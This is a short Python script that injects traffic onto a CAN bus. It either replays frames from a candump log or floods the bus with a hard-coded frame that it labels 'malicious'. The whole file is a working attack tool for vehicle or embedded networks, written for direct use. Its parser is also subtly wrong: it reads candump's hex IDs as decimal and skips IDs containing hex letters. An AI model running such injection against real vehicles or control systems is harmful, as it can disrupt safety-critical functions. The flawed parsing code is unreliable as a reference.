import can
import time
import re

# Create a CAN bus instance
bus = can.interface.Bus(channel='can0', interface='socketcan')

# Function to parse CAN frames from a candump file
def parse_candump_line(line):
    # Example line format: can0 400 [8] 78 28 6C 08 12 00 00 01
    pattern = re.compile(r'can0\s+(\d+)\s+\[\d+\]\s+([0-9A-Fa-f\s]+)')
    match = pattern.match(line)
    if match:
        can_id = int(match.group(1))
        data = bytearray.fromhex(match.group(2).replace(' ', ''))
        return can.Message(arbitration_id=can_id, data=data, is_extended_id=False)
    return None

# Function to read CAN frames from a file
def read_can_frames(filename):
    with open(filename, 'r') as f:
        for line in f:
            message = parse_candump_line(line.strip())
            if message:
                yield message

# Option 1: Inject frames from a candump file
candump_file = 'can_traffic.log'  # Change this to your candump file
use_candump_file = True  # Set to False to send custom data

if use_candump_file:
    print(f"Injecting frames from {candump_file}")
    for message in read_can_frames(candump_file):
        try:
            bus.send(message)
            print(f'Sent message from file: ID={hex(message.arbitration_id)} Data={message.data.hex()}')
            time.sleep(0.1)  # Adjust as needed
        except can.CanError as e:
            print(f"Failed to send message: {e}")
else:
    # Option 2: Send custom or malicious CAN data
    malicious_frame = can.Message(
        arbitration_id=0x123,  # Example CAN ID
        data=[0xFF, 0x00, 0xAB, 0xCD, 0xEF, 0x12, 0x34, 0x56],
        is_extended_id=False
    )

    try:
        while True:
            # Send malicious CAN frame
            bus.send(malicious_frame)
            print(f'Sent malicious message: ID={hex(malicious_frame.arbitration_id)} Data={malicious_frame.data.hex()}')
            time.sleep(1)  # Adjust as needed
    except KeyboardInterrupt:
        print("Injection stopped.")
    except can.CanError as e:
        print(f"Failed to send message: {e}")
